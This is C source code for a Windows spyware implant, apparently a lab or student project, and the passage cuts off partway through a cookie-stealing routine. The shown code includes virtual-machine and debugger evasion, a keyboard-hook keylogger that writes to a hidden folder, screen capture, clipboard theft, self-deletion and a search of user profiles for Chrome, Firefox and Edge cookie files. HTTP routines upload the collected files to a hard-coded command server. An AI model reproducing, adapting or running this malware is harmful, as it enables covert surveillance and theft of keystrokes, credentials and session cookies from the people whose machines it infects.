#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <strsafe.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <time.h>
#include <wchar.h>
#include <winuser.h>
#include <ctype.h>
#include <winhttp.h>
#include <string.h>
#include <shlobj.h>
#include <windows.h>
#include <iphlpapi.h>




/* Setup:

* sudo systemctl start mariadb.service
* sudo systemctl start httpd.service

*/
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32")

//#define SERVER_ADDRESS L"172.20.10.10" // Replace with server IP if necessary//////////////////////////
#define SERVER_ADDRESS L"192.168.1.7"
#define targetBin L"notepad.exe"
#define MAX_CLIPBOARD_LENGTH 1024

int  count = 0;
wchar_t DLLPath[] = TEXT("C:\\Users\\vog\\source\\repos\\Trial_DLL\\x64\\Debug\\Trial_DLL.dll");//needs to be dynamic
HHOOK hHook;
CHAR previous_title[1024] = "";
CHAR KeyToSend[1024] = "";
wchar_t id[17];
wchar_t local_appdata[MAX_PATH];
wchar_t patch_folder[MAX_PATH];
wchar_t screenshotFile[MAX_PATH];
wchar_t keyloggerFile[MAX_PATH];
wchar_t patch_folder_with_filename[MAX_PATH]; //saving keylogger using SaveToFile()
wchar_t clipboardFile_wide[MAX_PATH];
char clipboardFile[MAX_PATH];

static inline unsigned long long rdtsc() {  //VM detected if avg value is less than 750
	unsigned long lo, hi;
	unsigned long long ret1, ret2;
	__asm {
		rdtsc
		mov lo, eax
		mov hi, edx
	}
	ret1 = lo | (hi << 32);
	__asm {
		rdtsc
		mov lo, eax
		mov hi, edx
	}
	ret2 = lo | (hi << 32);
	return ret2 - ret1;
}
BOOL cpuid_check() {
	int a, b, c, d;
	__asm {
		mov eax, 0
		cpuid
		mov a, ebx
		mov b, edx
		mov c, ecx
	}
	if (a == 0x756e6547 && b == 0x49656e69 && c == 0x6c65746e) {
		printf("This is not a VM\n");
		return FALSE;
	}
	else {
		printf("This is a VM\n");
		return TRUE;
	}
}
BOOL debugger_present() {
	if (IsDebuggerPresent()) {
		printf("Debugger is present.\n");
		return TRUE;
	}
	else {
		printf("Debugger is not present.\n");
		return FALSE;
	}
}
int get_mac_address(char* mac_addr) {
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);

	if (dwStatus != ERROR_SUCCESS) {
		return -1;
	}

	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
	snprintf(mac_addr, 18, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
		pAdapterInfo->Address[0],
		pAdapterInfo->Address[1],
		pAdapterInfo->Address[2],
		pAdapterInfo->Address[3],
		pAdapterInfo->Address[4],
		pAdapterInfo->Address[5]);

	return 0;
}

// Function to check if the MAC address matches VirtualBox prefixes
BOOL is_vm_mac(const char* mac_addr) {
	// VirtualBox and Vmware MAC address prefix
	const char* vbox_prefix = "08:00:27";
	const char* vmware_prefix = "00:05:69";
	if (strncmp(mac_addr, vbox_prefix, strlen(vbox_prefix)) == 0) {
		printf("this is a VM\n");

		return TRUE;
	}

	else if (strncmp(mac_addr, vmware_prefix, strlen(vmware_prefix)) == 0) {
		printf("this is a VM\n");

		return TRUE;
	}
	return FALSE;
}

void ErrorExit(LPTSTR lpszFunction)

{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;

	LPVOID lpDisplayBuf;

	DWORD dw = GetLastError();

	FormatMessage(

		FORMAT_MESSAGE_ALLOCATE_BUFFER |

		FORMAT_MESSAGE_FROM_SYSTEM |

		FORMAT_MESSAGE_IGNORE_INSERTS,

		NULL,

		dw,

		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),

		(LPTSTR)&lpMsgBuf,

		0, NULL);

	// Display the error message and exit the process

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,

		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));

	StringCchPrintf((LPTSTR)lpDisplayBuf,

		LocalSize(lpDisplayBuf) / sizeof(TCHAR),

		TEXT("%s failed with error %d: %s"),

		lpszFunction, dw, lpMsgBuf);

	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);

	LocalFree(lpDisplayBuf);

	ExitProcess(dw);
}

BOOL SaveToFile(LPCWSTR Filename, CHAR* content, DWORD contentLength) {
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata))) {
		swprintf(patch_folder, MAX_PATH, L"%s\\%s", local_appdata, L"patch"); // Get the folder path
		// Construct the full path including the filename
		swprintf(patch_folder_with_filename, MAX_PATH, L"%s\\%s\\%s", local_appdata, L"patch", Filename);
	}
	DWORD bytesWritten;

	HANDLE hFile = CreateFileW(
		patch_folder_with_filename,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		// If the file does not exist, create a new one
		hFile = NULL;
		hFile = CreateFileW(patch_folder_with_filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		ErrorExit(_TEXT("CreateFileW"));

		if (GetLastError() == ERROR_FILE_NOT_FOUND) {
			hFile = NULL;
			hFile = CreateFileW(patch_folder_with_filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		}
	}

	SetFilePointer(hFile, 0, 0, FILE_END);

	if (!WriteFile(hFile, content, contentLength, &bytesWritten, NULL)) {
		printf("Error %u in WriteFile.\n", GetLastError());
		ErrorExit(_TEXT("WriteFile"));
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	wprintf(L"Content written to file: %ls\n", Filename);
	return TRUE;
}

BOOL SaveIDFile(LPCWSTR Filename, CHAR* content, DWORD contentLength) {
	DWORD bytesWritten;

	HANDLE hFile = CreateFileW(
		Filename,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		// If the file does not exist, create a new one
		hFile = NULL;
		hFile = CreateFileW(patch_folder_with_filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		ErrorExit(_TEXT("CreateFileW"));

		if (GetLastError() == ERROR_FILE_NOT_FOUND) {
			hFile = NULL;
			hFile = CreateFileW(patch_folder_with_filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		}
	}

	SetFilePointer(hFile, 0, 0, FILE_END);

	if (!WriteFile(hFile, content, contentLength, &bytesWritten, NULL)) {
		printf("Error %u in WriteFile.\n", GetLastError());
		ErrorExit(_TEXT("WriteFile"));
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	wprintf(L"Content written to file: %ls\n", Filename);
	return TRUE;
}

int create_hidden_folder(const wchar_t* parent_dir, const wchar_t* folder_name) {
	// Construct the full path for the folder
	wchar_t folder_path[MAX_PATH];
	swprintf(folder_path, MAX_PATH, L"%s\\%s", parent_dir, folder_name);

	// Create the folder
	if (CreateDirectoryW(folder_path, NULL)) {
		// Set the hidden attribute for the folder
		if (SetFileAttributesW(folder_path, FILE_ATTRIBUTE_HIDDEN)) {
			wprintf(L"Hidden folder created successfully: %ls\n", folder_path);
			return 0;
		}
		else {
			wprintf(L"Failed to set hidden attribute for folder: %ls\n", folder_path);
		}
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		//	printf("patch folder already exists!");
		return 2;
	}
	return 1;
}

CHAR* GetWindowTitle() {
	static CHAR window_title[1024];
	HWND HWindow = GetForegroundWindow();
	if (HWindow)
	{
		int titleLength = GetWindowTextA(HWindow, window_title, sizeof(window_title));
		if (titleLength > 0) {
			window_title[titleLength] = '\0'; // Null-terminate the string
			return window_title;
		}
	}
	return NULL;
}

CHAR SpecialChar(int vkCode, int SHIFT_KEY, UINT uMapped, KBDLLHOOKSTRUCT* pEventInfo) {
	if (SHIFT_KEY) { // Handle shifted number keys
		if (vkCode >= 0x30 && vkCode <= 0x39) { //0 to 9
			char pressedChar = ")!@#$%^&*("[pEventInfo->vkCode - 0x30]; //character array to map shifted number keys to their corresponding symbols
			//printf("\nYou pressed %c", pressedChar);//
			return pressedChar;
		}
		else if (vkCode == 0xBA || vkCode == 0xBB) { // : +
			char pressedChar = ":+"[pEventInfo->vkCode - 0xBA];
			//printf("\nYou pressed %c", pressedChar);//
			return pressedChar;
		}
		else if (vkCode == 0xBF || vkCode == 0xC0) { // ?~
			char pressedChar = "?~"[pEventInfo->vkCode - 0xBF];
			//printf("\nYou pressed %c", pressedChar);//
			return pressedChar;
		}
		else if (vkCode >= 0xDB && vkCode <= 0xDE) { //|?}{"
			char pressedChar = "{|}\""[pEventInfo->vkCode - 0xDB];
			//printf("\nYou pressed %c", pressedChar);//
			return pressedChar;
		}
		else if (vkCode == 0xBC || vkCode == 0xBE) { // <>
			char pressedChar = ">$<"[pEventInfo->vkCode - 0xBC];
			//printf("\nYou pressed %c", pressedChar);//
			return pressedChar;
		}
		else if (vkCode == 0xBD) {
			return '_';
		}
	}
	else {
		return (CHAR)uMapped;
	}
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	CHAR* title = GetWindowTitle();
	if (title != NULL && strcmp(previous_title, title) != 0) {
		strcpy_s(previous_title, 1024, title); // Update the previous title
		// Concatenate or write title and KeyToSend to a buffer
		char buffer[2048]; // Adjust size as needed
		snprintf(buffer, sizeof(buffer), "%s\n%s\n", title, KeyToSend);
		// Save the buffer to the file
		SaveToFile(L"keylogger.txt", buffer, strlen(buffer));
	}

	BOOL SHIFT_KEY = 0;
	BOOL CAPS_KEY = 0;
	KBDLLHOOKSTRUCT* pEventInfo = (KBDLLHOOKSTRUCT*)lParam;
	UINT uMapped = MapVirtualKey(pEventInfo->vkCode, 2);
	if (GetKeyState(VK_CAPITAL))//check if pressed
	{
		CAPS_KEY = 1;
	}
	if (GetKeyState(VK_SHIFT) & 0x8000) {//check if pressed
		SHIFT_KEY = 1;
	}
	if (wParam == WM_KEYDOWN) {
		//backspace
		if (pEventInfo->vkCode == 0x08) {
			//printf("\n<BACKSPACE>");//
			char* KeyPressed = "\n<BACKSPACE>\n";
			SaveToFile(L"keylogger.txt", KeyPressed, strlen(KeyPressed));
		}
		//are any of these pressed?
		if (!(pEventInfo->vkCode == VK_CAPITAL || pEventInfo->vkCode == VK_SHIFT || pEventInfo->vkCode == VK_RSHIFT || pEventInfo->vkCode == VK_LSHIFT)) {
			//printf("\nshift\t %d", SHIFT_KEY);//
			//printf("\ncaps\t %d", CAPS_KEY);//

			if (SHIFT_KEY || CAPS_KEY) {
				char KeyToSend[2] = { ((char)uMapped), '\0' };
				SaveToFile(L"keylogger.txt", KeyToSend, strlen(KeyToSend));
			}
			if (!SHIFT_KEY && !CAPS_KEY) {
				//printf("\nYou pressed: %c", uMapped);//
				char KeyToSend[2] = { (char)tolower((char)uMapped), '\0' }; // Convert to lowercase and save the character to a string
				SaveToFile(L"keylogger.txt", KeyToSend, strlen(KeyToSend));
			}
			else {
				char KeyToSend[2];
				switch (pEventInfo->vkCode) {
					//numbers and shifts
				case 0x30:// letter '0'
				case 0x31:
				case 0x32:
				case 0x33:
				case 0x34:
				case 0x35:
				case 0x36:
				case 0x37:
				case 0x38:
				case 0x39:// letter '9'
					KeyToSend[0] = SpecialChar(pEventInfo->vkCode, SHIFT_KEY, uMapped, pEventInfo);
					KeyToSend[1] = '\0';
					SaveToFile(L"keylogger.txt", KeyToSend, strlen(KeyToSend));
					break;

				case 0xBA: //the : key
				case 0xBB: //the +
				case 0xBF: //the /? key
				case 0xC0: //the `~ key
				case 0xDB: //the [{ key
				case 0xDC: //the \\| key
				case 0xDD: //the ]} key
				case 0xDE: //the '" key
				case 0xBC://the < key
				case 0xBE://the > key
				case 0xBD: //- and _ depending on shift
					KeyToSend[0] = SpecialChar(pEventInfo->vkCode, SHIFT_KEY, uMapped, pEventInfo);
					KeyToSend[1] = '\0';
					SaveToFile(L"keylogger.txt", KeyToSend, strlen(KeyToSend));
					break;
				default:
					// Handle other keys
					break;
				}
			}
		}
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

BOOL keylog() {
	hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	// pump windows events
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);
	return 0;
}

LPSTR http_get(wchar_t* id) {
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;

	// Initialize WinHTTP session
	hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		printf("Error %u in WinHttpOpen.\n", GetLastError());
		ErrorExit(L"WinHttpOpen");
		return 1;
	}

	// Connect to the server
	hConnect = WinHttpConnect(hSession, SERVER_ADDRESS,
		INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect) {
		printf("Error %u in WinHttpConnect.\n", GetLastError());
		ErrorExit(L"WinHttpConnect");
		WinHttpCloseHandle(hSession);
		return 1;
	}

	const wchar_t* api = L"/api/api-"; // Change to const pointer
	const wchar_t* txt = L".txt";  // Change to const pointer

	// Allocate memory for concatenated strings
	wchar_t apiString[100]; // Adjust the size as per your requirement
	wchar_t apifilenameEXT[100]; // Adjust the size as per your requirement

	// Copy the api string to apiString
	wcscpy_s(apiString, 100, api);
	// Concatenate id to apiString
	wcscat_s(apiString, 100, id);

	// Concatenate .txt to apiString
	wcscpy_s(apifilenameEXT, 100, apiString);

	wcscat_s(apifilenameEXT, 100, txt);

	wprintf(L"%s\n", apifilenameEXT); // Print the concatenated string
	// Create an HTTP request handle.
	hRequest = WinHttpOpenRequest(hConnect, L"GET", apifilenameEXT,
		NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		0);
	if (!hRequest) {
		printf("Error %u in WinHttpOpenRequest.\n", GetLastError());
		ErrorExit(_TEXT("WinHttpOpenRequest"));
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 1;
	}

	// Send the request.
	bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);
	if (!bResults) {
		printf("Error %u in WinHttpSendRequest.\n", GetLastError());
		ErrorExit(_TEXT("WinHttpSendRequest"));
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 1;
	}

	// End the request.
	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
		ErrorExit(_TEXT("WinHttpReceiveResponse"));
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 1;
	}

	// Keep checking for data until there is nothing left.
	do {
		// Check for available data.
		dwSize = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
			printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
			ErrorExit(_TEXT("WinHttpQueryDataAvailable"));
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 1;
		}

		// Allocate space for the buffer.
		pszOutBuffer = malloc(dwSize + 1);
		if (!pszOutBuffer) {
			printf("Out of memory\n");
			ErrorExit(_TEXT("malloc"));
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 1;
		}

		// Read the data.
		ZeroMemory(pszOutBuffer, dwSize + 1);
		if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
			printf("Error %u in WinHttpReadData.\n", GetLastError());
			ErrorExit(_TEXT("WinHttpReadData"));
			free(pszOutBuffer);
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 1;
		}

		return pszOutBuffer;

		// Free the memory allocated to the buffer.
		free(pszOutBuffer);
	} while (dwSize > 0);

	// Clean up.
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
}

BOOL http_post(LPCWSTR filePath, wchar_t* id) {
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL bResults = FALSE;
	DWORD dwFileSize = 0;
	DWORD dwBytesRead = 0;
	HANDLE hFile = NULL;
	LPBYTE pBuffer = NULL;

	// Check if filePath is NULL, if so, send an empty POST request
	if (filePath == NULL) {
		dwFileSize = 0; // Set file size to 0 for an empty request
	}
	else {
		// Open the file
		hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("Error: Cannot open file\n");
			return FALSE;
		}

		// Get the file size
		dwFileSize = GetFileSize(hFile, NULL);
		if (dwFileSize == INVALID_FILE_SIZE) {
			printf("Error: Cannot get file size\n");
			CloseHandle(hFile);
			return FALSE;
		}

		// Allocate memory for buffer
		pBuffer = (LPBYTE)malloc(dwFileSize);
		if (!pBuffer) {
			printf("Error: Memory allocation failed\n");
			CloseHandle(hFile);
			return FALSE;
		}

		// Read the entire file into the buffer
		if (!ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL)) {
			printf("Error: Cannot read file\n");
			free(pBuffer);
			CloseHandle(hFile);
			return FALSE;
		}
	}

	// Initialize WinHTTP
	hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		printf("Error in WinHttpOpen: %lu\n", GetLastError());
		free(pBuffer);
		CloseHandle(hFile);
		return FALSE;
	}

	// Connect to the server
	hConnect = WinHttpConnect(hSession, SERVER_ADDRESS, INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect) {
		printf("Error in WinHttpConnect: %lu\n", GetLastError());
		free(pBuffer);
		CloseHandle(hFile);
		WinHttpCloseHandle(hSession);
		return FALSE;
	}

	const wchar_t* UploadID = L"/upload.php?id="; // Change to const pointer

	// Allocate memory for concatenated strings
	wchar_t UploadIDSring[100]; // Adjust the size as per your requirement

	// Copy the api string to apifile
	wcscpy_s(UploadIDSring, 100, UploadID);
	// Concatenate id to apifile
	wcscat_s(UploadIDSring, 100, id);

	// Open the request
	hRequest = WinHttpOpenRequest(hConnect, L"POST", UploadIDSring, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) {
		printf("Error in WinHttpOpenRequest: %lu\n", GetLastError());
		free(pBuffer);
		CloseHandle(hFile);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return FALSE;
	}

	// Send the request and write the entire file contents to it
	bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, pBuffer, dwFileSize, dwFileSize, 0);
	if (!bResults) {
		printf("Error in WinHttpSendRequest: %lu\n", GetLastError());
		free(pBuffer);
		CloseHandle(hFile);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return FALSE;
	}

	// End the request
	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		printf("Error in WinHttpReceiveResponse: %lu\n", GetLastError());
		free(pBuffer);
		CloseHandle(hFile);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return FALSE;
	}

	printf("File sent successfully\n");

	// Clean up
	free(pBuffer);
	CloseHandle(hFile);
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return TRUE;
}

int GenerateID(wchar_t* id) {
	// Character set containing uppercase letters, lowercase letters, and numbers
	wchar_t charset[] = L"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int charsetSize = sizeof(charset) / sizeof(wchar_t) - 1; // Size of the character set

	// Seed the random number generator
	srand((unsigned int)time(NULL));

	// Generate 16 random characters
	for (int i = 0; i < 16; i++) {
		id[i] = charset[rand() % charsetSize];
	}

	// Null-terminate the string
	id[16] = L'\0';
}

BOOL ReadIdFromFile(wchar_t* patch_folder, wchar_t* id) {
	// Construct the full path to "id.txt"
	wchar_t id_file[MAX_PATH];
	wcscpy_s(id_file, MAX_PATH, patch_folder);
	wcscat_s(id_file, MAX_PATH, L"\\id.txt");

	// Check if the file exists
	DWORD attributes = GetFileAttributesW(id_file);
	if (attributes != INVALID_FILE_ATTRIBUTES && !(attributes & FILE_ATTRIBUTE_DIRECTORY)) {
		DWORD bytesRead;
		HANDLE hFile = CreateFileW(
			id_file,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (hFile != INVALID_HANDLE_VALUE) {
			if (ReadFile(hFile, id, 16 * sizeof(wchar_t), &bytesRead, NULL)) {
				// Null-terminate the string
				id[bytesRead / sizeof(wchar_t)] = L'\0';
				CloseHandle(hFile);
				return TRUE; // Successfully read the ID from file
			}
			else {
				printf("Error %u in ReadFile.\n", GetLastError());
			}
			CloseHandle(hFile);
		}
		else {
			printf("Error %u in CreateFileW.\n", GetLastError());
		}
	}

	return FALSE; // Failed to read the ID from file
}

void SaveBitmapToFile(const wchar_t* filename, HBITMAP hBitmap) {
	BITMAP bmp;
	HANDLE file;
	HDC hdc;
	DWORD dwWritten;
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bi;
	LPBYTE lpBits;
	DWORD dwBitsSize;

	// Retrieve the bitmap color format, width, and height
	GetObject(hBitmap, sizeof(BITMAP), &bmp);

	// Initialize the bitmap info header
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmp.bmWidth;
	bi.biHeight = bmp.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = bmp.bmBitsPixel;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	// Calculate the size of the bitmap bits
	hdc = GetDC(NULL);
	GetDIBits(hdc, hBitmap, 0, bmp.bmHeight, NULL, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
	dwBitsSize = bi.biSizeImage;

	// Allocate memory for the bitmap bits
	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, dwBitsSize);
	if (!lpBits) {
		printf("Error: GlobalAlloc failed\n");
		return;
	}

	// Retrieve the bitmap bits
	if (!GetDIBits(hdc, hBitmap, 0, bmp.bmHeight, lpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
		printf("Error: GetDIBits failed\n");
		GlobalFree((HGLOBAL)lpBits);
		return;
	}

	// Open the file
	file = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("Error: CreateFile failed\n");
		GlobalFree((HGLOBAL)lpBits);
		return;
	}

	// Write the bitmap file header
	bmfHeader.bfType = 0x4D42;
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBitsSize;
	bmfHeader.bfReserved1 = 0;
	bmfHeader.bfReserved2 = 0;
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	if (!WriteFile(file, &bmfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL)) {
		printf("Error: WriteFile header failed\n");
		CloseHandle(file);
		GlobalFree((HGLOBAL)lpBits);
		return;
	}

	// Write the bitmap info header
	if (!WriteFile(file, &bi, sizeof(BITMAPINFOHEADER), &dwWritten, NULL)) {
		printf("Error: WriteFile infoheader failed\n");
		CloseHandle(file);
		GlobalFree((HGLOBAL)lpBits);
		return;
	}

	// Write the bitmap bits
	if (!WriteFile(file, lpBits, dwBitsSize, &dwWritten, NULL)) {
		printf("Error: WriteFile bits failed\n");
		CloseHandle(file);
		GlobalFree((HGLOBAL)lpBits);
		return;
	}

	// Close the file
	CloseHandle(file);
	GlobalFree((HGLOBAL)lpBits);
	ReleaseDC(NULL, hdc);
}

void TakeAndSaveScreenshot(const wchar_t* directory) {
	wchar_t fullpath[260];
	swprintf(fullpath, 260, L"%s\\photo.bmp", directory);

	// Get the desktop device context
	HDC hScreenDC = GetDC(NULL);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

	// Get the screen dimensions
	int screenWidth = GetDeviceCaps(hScreenDC, HORZRES);
	int screenHeight = GetDeviceCaps(hScreenDC, VERTRES);

	// Create a bitmap
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);

	// Select the bitmap into the memory DC
	HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

	// Bit block transfer into the memory DC
	BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

	// Save the bitmap as a file
	SaveBitmapToFile(fullpath, hBitmap);

	// Cleanup
	SelectObject(hMemoryDC, hOldBitmap);
	DeleteObject(hBitmap);
	DeleteDC(hMemoryDC);
	ReleaseDC(NULL, hScreenDC);
}

void stealClipboardAndSaveToFile(const char* clipboardFile) {
	// Open the clipboard
	if (!OpenClipboard(NULL)) {
		perror("Failed to open clipboard");
	}

	// Get the clipboard data
	HANDLE hClipboardData = GetClipboardData(CF_TEXT);
	if (hClipboardData == NULL) {
		perror("Failed to get clipboard data");
		CloseClipboard();
	}

	// Lock the handle to get the actual text pointer
	char* clipboardContent = (char*)GlobalLock(hClipboardData);
	if (clipboardContent == NULL) {
		perror("Failed to lock clipboard data");
		CloseClipboard();
	}

	// Save clipboard contents to filez
	FILE* outputFile = fopen(clipboardFile, "w");
	if (outputFile == NULL) {
		perror("Failed to open output file");
		GlobalUnlock(hClipboardData);
		CloseClipboard();
	}

	fputs(clipboardContent, outputFile);

	// Close output file
	fclose(outputFile);

	// Unlock and close the clipboard
	GlobalUnlock(hClipboardData);
	CloseClipboard();
}

void deleteSelf() {
	TCHAR szFilePath[MAX_PATH];
	if (GetModuleFileName(NULL, szFilePath, MAX_PATH) == 0) {
		printf("Error getting file path.\n");
		return;
	}

	// Try to remove read-only attribute if set
	if (SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL) == 0) {
		printf("Error removing file attributes: %d\n", GetLastError());
	}

	// Delay deletion after program termination
	if (MoveFileEx(szFilePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT) == 0) {
		printf("Error scheduling file deletion: %d\n", GetLastError());
		return;
	}

	printf("Executable deletion scheduled successfully. It will be deleted after the program exits.\n");
}

void stealCookies() {
	WIN32_FIND_DATAW findFileData;
	HANDLE hFind;
	LPCWSTR searchpath = L"C:\\Users\\";
	LPCWSTR broswers[] = { L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\cookies", L"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\cookies", L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\cookies" };
	LPCWSTR users[] = { L"Default", L"All Users", L"Default User", L"desktop.ini", L"Public",L".." };
	LPCWSTR* usernames = (LPCWSTR*)malloc(1 * sizeof(LPCWSTR));
	wchar_t concatenatedPath[200];
	int username_counter = -1;
	hFind = FindFirstFileW(L"C:\\Users\\*", &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		wprintf(L"No files found.\n");
		return 1;
	}
	else {
		while (FindNextFileW(hFind, &findFileData) != 0) {
			BOOL isExcluded = FALSE;
			for (int i = 0; i < 6; i++) {
				if (wcscmp(findFileData.cFileName, users[i]) == 0) {
					isExcluded = TRUE;
					break;
				}
			}
			if (!isExcluded) {
				username_counter++;
				usernames = (LPCWSTR*)realloc(usernames, (username_counter + 1) * sizeof(LPCWSTR));
				size_t len = wcslen(findFileData.cFileName) + 1;
				usernames[username_counter] = (LPCWSTR)malloc(len * sizeof(wchar_t));
				usernames[username_counter] = _wcsdup(findFileData.cFileName);
			}
		}
	}
	// Concatenate the path with the browser path
	for (int i = 0; i < 3; i++) {
		for (int j = 0; j <= username_counter; j++) {
			wsprintfW(concatenatedPath, L"%s%s", searchpath, usernames[j]);
			wsprintfW(concatenatedPath, L"%s%s", concatenatedPath, broswers[i]);
			LPCWSTR concatenatedPathLPCWSTR = concatenatedPath;
			hFind = FindFirstFileW(concatenatedPathLPCWSTR, &findFileData);
			if (hFind != INVALID_HANDLE_VALUE) {
				wprintf(L"Files found in %s:\n", concatenatedPath);
